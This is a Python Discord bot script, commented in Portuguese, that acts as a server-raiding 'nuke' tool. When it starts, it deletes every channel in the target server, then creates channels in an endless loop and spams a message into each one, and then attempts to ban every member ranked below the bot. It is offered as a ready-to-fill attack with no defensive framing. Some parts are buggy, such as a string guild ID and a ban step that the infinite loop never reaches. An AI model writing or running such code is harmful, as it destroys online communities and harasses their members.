import discord
from discord.ext import commands
import asyncio

# Substitua pelo token do seu bot
TOKEN = "token do bot" # se nao funcionar ao por o token aqui, substitua por quaisquer numeros
# Substitua pelo ID do servidor
GUILD_ID = "server id"
# Nome dos canais que você deseja criar
CHANNEL_NAME = 'nome do canal'

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.members = True  # Necessário para obter a lista de membros

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logado como {bot.user.name}')
    guild = bot.get_guild(GUILD_ID)
    
    if guild is None:
        print("Servidor não encontrado.")
        await bot.close()
        return

    # Excluindo todos os canais existentes
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f'Canal {channel.name} deletado.')
        except discord.Forbidden:
            print(f'Não tenho permissão para deletar o canal {channel.name}.')
        except discord.HTTPException as e:
            print(f'Erro ao deletar o canal {channel.name}: {e}')

#diff

    # Criando canais infinitamente
    while True:
        try:
            new_channel = await guild.create_text_channel(CHANNEL_NAME)
            print(f'Canal {CHANNEL_NAME} criado.')

            # Enviar mensagem @everyone no novo canal
            try:
                await new_channel.send(f'mensagem que vai ser enviada')
                print(f'Mensagem @everyone enviada no canal {new_channel.name}.')
            except discord.Forbidden:
                print(f'Não tenho permissão para enviar mensagens no canal {new_channel.name}.')
            except discord.HTTPException as e:
                print(f'Erro ao enviar a mensagem @everyone no canal {new_channel.name}: {e}')
            
            await asyncio.sleep(0,0)  # Espera de 0 segundo entre as criações
        except discord.Forbidden:
            print('Não tenho permissão para criar canais.')
            await bot.close()
            break
        except discord.HTTPException as e:
            print(f'Erro ao criar o canal {CHANNEL_NAME}: {e}')
            await bot.close()
            break
#4
    bot_member = guild.get_member(bot.user.id)
    if bot_member is None:
        print("Bot não encontrado no servidor.")
        await bot.close()
        return
#5
    bot_role = bot_member.top_role
    for member in guild.members:
        try:
            if member.top_role < bot_role:
                await member.ban(reason="Banido por bot.")
                print(f'Membro {member.name} banido.')
        except discord.Forbidden:
            print(f'Não tenho permissão para banir o membro {member.name}.')
        except discord.HTTPException as e:
            print(f'Erro ao banir o membro {member.name}: {e}')


bot.run("token do bot")